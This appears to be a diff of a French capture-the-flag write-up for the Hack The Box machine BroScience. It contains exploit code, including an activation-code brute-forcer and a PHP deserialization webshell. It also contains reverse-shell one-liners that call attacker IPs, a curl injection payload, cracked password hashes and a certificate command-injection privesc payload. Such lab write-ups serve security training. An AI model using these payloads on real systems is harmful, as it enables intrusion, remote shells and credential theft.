@@ -10,17 +10,20 @@ notbefore: 2023-04-15
 ---
 
 # Enumération
+
 Ports TCP ouverts
+
 ```bash
 22/tcp  open  ssh                                                                                                                                                                                                                          
 80/tcp  open  http                                                                                                                                                                                                                         
 443/tcp open  https      
 ```
 
-
 # Service WEB
 ## Port 80
+
 La banière du serveur retourne : `Apache/2.4.54 (Debian) Server at broscience.htb Port 80`
+
 Toutes les pages du serveur semblent être redirigées vers la même URL sur le port 443 (HTTPS)
 
 ```
@@ -28,36 +31,47 @@ feroxbuster -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 ```
 
 Seul certaines url mal formées ne semble pas déclencher la redirection :
+
 ```
 http://broscience.htb/http%3A%2F%2Fyoutube
 ```
+
 Mais cela ne semble a première vue pas exploitable
 
 ## Port 443
+
 La banière du serveur retourne : `Apache/2.4.54 (Debian) Server at broscience.htb Port 443`
 
-### Dossiers intéressants 
+### Dossiers intéressants
+
 ```
 feroxbuster -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -t 50  --auto-tune -u https://$TARGET_VHOST/ --filter-status 301,404 -k --add-slash --no-recursion 
 ```
+
 ![BroScience-1](../../BroScience-1.png)
 
 Parmis les dossiers énumérés, le dossier `includes` contient des fichiers intéresant. Il ne sont toutefois pas visualisables mais nous chercherons à les lire par la suite.
+
 ![BroScience-2](../../BroScience-2.png)
 
 On découvre que le dossier `images` contient l'ensemble des images du site
+
 ![BroScience-3](../../BroScience-3.png)
 
 La documentation d'apache 2.4 est également hébergée localement mais ne présente aucun intérêt :
-https://broscience.htb/manual/
-![BroScience-4](../../BroScience-4.png)
 
+<https://broscience.htb/manual/>
+
+![BroScience-4](../../BroScience-4.png)
 
 ### Découverte manuelle du site
 ##### Fichier /includes/img.php
+
 LFI potentielle via le paramètre path :
+
 - Paramètre légitime :`/includes/img.php?path=deadlift.png`
 - Protection présente retournant :
+
 ```HTTP/1.1 200 OK
 Date: Wed, 15 Feb 2023 22:12:48 GMT
 Server: Apache/2.4.54 (Debian)
@@ -67,6 +81,7 @@ Content-Type: text/html; charset=UTF-8
 
 <b>Error:</b> Attack detected.
 ```
+
 - Motifs déclenchants ce blocage :
 	- `../`
 	- `/etc/passwd`
@@ -75,9 +90,7 @@ Content-Type: text/html; charset=UTF-8
 	- null byte
 	- RFI
 	- `' and die(system("curl http://10.10.14.147")) or '`
-	- et autre suggestions provenant de https://book.hacktricks.xyz/pentesting-web/file-inclusion
-
-
+	- et autre suggestions provenant de <https://book.hacktricks.xyz/pentesting-web/file-inclusion>
 
 ```
 # découverte du compte utilisateur 'bill' disposant d'un shell sur le système 
@@ -100,14 +113,16 @@ $db_salt = "NaCl";
 
 ```
 
-
 # Découverte du code source de l'application
 
 On énumère ensuite les quelques fichiers constituant le code source de l'application :
+
 ![BroScience-9](../../BroScience-9.png)
 
 ## Enumération des vulnérabilités
+
 En analysant le code de l'application, nous découvrons rapidement  plusieures vulnérabilités :
+
 - Vulnérabilité 1 : Mauvaise initialisation du générateur de nombres aléatoires responsables de la génération du code d'activation rendant possible la découverte du code d'activation
 - Vulnérabilité 2 : Absence de protection concernant la désérialisation d'un cookie utilisateur rendant possible l'exécution de code arbitraire à distance.
 La vulnérabilité 2 n'étant exploitable que dans la zone authentifiée du site, il faudra d'abord exploiter la vulnérabilité 1 pour obtenir une exécution de code arbitraire à distance.
@@ -116,7 +131,9 @@ La vulnérabilité 2 n'étant exploitable que dans la zone authentifiée du site
 ### Vulnérabilité 1 : Activation d'un compte de test
 
 #### Analyse de la vulnérabilité
+
 La fonction responsable de la génération du code d'activation lors de la création d'un compte utilisateur est la suivante :
+
 ```php
 function generate_activation_code() {
 	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
@@ -136,6 +153,7 @@ Cela signifit qu'en sachant à quelle heure a eu lieu la création du compte uti
 Etant donné que le serveur à exploiter et notre machine ne sont pas synchronisés niveau temps, on devra bruteforcer quelques codes d'activation avant et après celui correspondant à l'heure d'activation.
 
 #### Attaque du code d'activation
+
 ```php  
 <?php
     /*
@@ -189,6 +207,7 @@ Au bout de quelques secondes, le compte utilisateur nouvellement créé par le s
 La partie authentifiée du site propose un système de thème. Le thème devant être affiché est paramétré à l'aide d'un cookie utilisateur. Ce cookie contient une version sérializée d'un objet PHP indiquant le thème à utiliser pour le rendu de la page.
 
 Lorsqu'une page est affichée dans la section authentifiée du site, le cookie est désérialisé sans aucun mécanisme de vérification dans la fonction `get_theme()`  du fichier `/includes/utils.php`:
+
 ```php
 function get_theme() {
     if (isset($_SESSION['id'])) {
@@ -205,8 +224,11 @@ function get_theme() {
     }
 }
 ```
+
 ##### Classes utilisables pour réaliser une inclusion de fichier à distance (RFI)
+
 La présence dans le code php des 2 classes suivantes rendent possible la création d'un fichier contenant du code php menant à une exécution de code arbitraire à distance
+
 ```php
 class Avatar {
     public $imgPath;
@@ -233,9 +255,10 @@ class AvatarInterface {
 }
 ```
 
-
 #### Exploitation
+
 On crée puis exécute ce script qui générera un cookie valide qui une fois désérialisé, créera le fichier `$payload_path ` qui contiendra `$payload` :
+
 ```php
 <?php
     // code vulnérable unserialize(base64_decode($up_cookie));
@@ -293,26 +316,32 @@ On crée puis exécute ce script qui générera un cookie valide qui une fois d�
 ```
 
 On insère ensuite ce cookie dans une requête interceptée à l'aide de Burp :
+
 ![BroScience-10](../../BroScience-10.png)
 
 # Obtention d'un shell
 
 Pour une raison non maîtrisée, les reverse shell PHP ne semblaient pas fonctionner correctement, c'est pourquoi le code présenté ci-dessus n'est un "Webshell" très basique.
+
 On l'utilise pour obtenir un reverse shell de la manière suivante :
 
 - On crée un script `revshell.sh` qui contiendra notre reverse shell à exécuter :
+
 ```bash
 $ cat revshell.sh                                                
 #!env sh
 /bin/sh -i >& /dev/tcp/10.10.14.179/1337 0>&1
 ```
+
 - On le rend téléchargeable en lancant un serveur web depuis le dossier contenant ce script à l'aide de la commande `python -m http.server 80`
 - On le télécharge via le webshell dans le dossier courant qui dispose d'un droit en écriture pour www-data :
+
 ```
 curl -X GET http://broscience.htb/rebrec2.php?cmd=wget%20http://10.10.14.179/revshell.sh 
 ```
 
 - On l'exécute après avoir lancé localement un listener à l'aide de la commande `rlwrap nc -lnvp 1337` :
+
 ```
 curl -X GET http://broscience.htb/rebrec2.php?cmd=bash%20./revshell.sh 
 ```
@@ -325,9 +354,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 # Elevation de privilèges
 
 ###################################################################
+
 # ANCIENNE RESOLUTION ERRONNEE
+
 ###################
+
 Après avoir téléchargé le script `lse.sh` puis l'avoir exécuté avec la commande : `bash ./lse.sh -l1 p1`, on découvre que le shell `bash` est setuid root :
+
 ```
 [!] fst020 Uncommon setuid binaries........................................ yes!                                      
 ---                                                                                                                   
@@ -336,6 +369,7 @@ Après avoir téléchargé le script `lse.sh` puis l'avoir exécuté avec la com
 ```
 
 Il ne reste plus qu'à obtenir les privilèges root et afficher les flags :
+
 ```
 $ bash -p                                                                                                             
 id                                                                                                                    
@@ -346,9 +380,10 @@ cat /home/bill/user.txt
 0d8eadfb********617b5debcecbfe54                      
 ```
 
-
 #####################################
+
 # NOUVELLE RESOLUTION PRIVESC
+
 #####################################
 
 On cherche dans la base de donnée si elle ne contient pas des informations intéressantes.
@@ -362,6 +397,7 @@ psql -h localhost -U dbuser -d broscience
 ```
 
 On liste les tables disponibles avec
+
 ```
 \dt
 ```
@@ -383,6 +419,7 @@ select * from users;
 On enregistre ce contenu dans le fichier `raw`
 
 La génération du mot de passe est détaillée dans les fichiers suivants :
+
 - db_connect.php : on y trouve la valeur du salt : `$db_salt = "NaCl"`.
 - register.php : on y trouve que le mot de passe stocké en base est un hash MD5 de la concaténation du Salt et du mot de passe.
 
@@ -399,6 +436,7 @@ aze1:5cd6546fa55766a2210b9bb796127a2e$NaCl
 ```
 
 On crack enfin nos hashes en précisant le format de génération des hashes :
+
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)' hashes 
 Using default input encoding: UTF-8
@@ -412,10 +450,10 @@ Aaronthehottest  (dmytro)
 
 On se connecte ensuite en tant que "bill" via SSH et on récupère le Flag utilisateur.
 
-
 Privesc
 
 On découvre le script `/opt/renew_cert.sh` qui est vulnérable à une injection de commande bash.
+
 A première vue, ce script n'est pas exécuté dans cron ou tout du moins, pas depuis un emplacement sur lequel nous avons des droits de lecture.
 
 On vérifie s'il est appelé autrement via l'outil `pspy`.
@@ -423,10 +461,10 @@ On vérifie s'il est appelé autrement via l'outil `pspy`.
 Au bout d'une minute, on découvre qu'il est effectivement appelé par l'utilisateur root avec en paramètre un certificat situé dans `/home/bill/Certs/broscience.crt`
 
 Après analyse du script vulnérable on détermine les éléments permettant de déclencher une exécution de code arbitraire :
+
 - il faut un certificat expirant dans moins de 24h
 - il faut que le `Common Name` contienne l'injection de commande.
 
 Après quelques test, facilités via le lancement du script à l'aide de `bash -x`, on on arrive à créer une payload fonctionnelle.
-
 
 `$(bash -c 'bash -i >& /dev/tcp/10.10.14.34/1338 0>&1'`
